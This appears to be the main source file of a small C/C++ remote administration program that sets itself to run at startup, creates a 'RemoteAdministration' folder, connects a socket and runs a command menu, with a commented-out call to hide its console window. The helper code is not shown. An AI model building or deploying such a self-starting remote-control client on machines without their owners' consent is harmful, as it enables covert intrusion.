#include "Header.h"
#include <iostream>
void main(void)
{
	struct Data data;
	
	//FreeConsole();
	
	SelfAutorun();

	CreateDirectory("D:\\RemoteAdministration", NULL);

	CreatSocketAndConnect(&data);
	 
	Menu(&data);

	CloseConnect(&data);
	return;
}